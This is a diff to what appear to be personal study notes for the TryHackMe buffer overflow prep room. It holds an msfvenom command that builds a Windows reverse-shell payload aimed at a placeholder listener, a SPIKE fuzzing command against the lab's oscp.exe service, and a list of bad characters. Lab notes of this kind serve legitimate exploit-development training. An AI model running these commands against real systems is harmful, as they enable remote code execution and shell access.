@@ -8,6 +8,12 @@ Buffer overflow Room can be Found at:--> https://tryhackme.com/room/bufferoverfl
 
      msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-port> -f py -b "\<badChars-specific-to-overflow\>" EXITFUNC=thread -v shellcode
 
+**command to be used with spike scripts to find payload triggering the crash**
+
+generic_send_tcp <target-ip> 1337{this port is specific to the oscp.exe} fuzz.spk 0 0
+    
+ More on spike:--> https://resources.infosecinstitute.com/topic/intro-to-fuzzing/
+    
 # OVERFLOW 1
 
 **Bad Chars:--> \x00\x07\x2e\xa0**
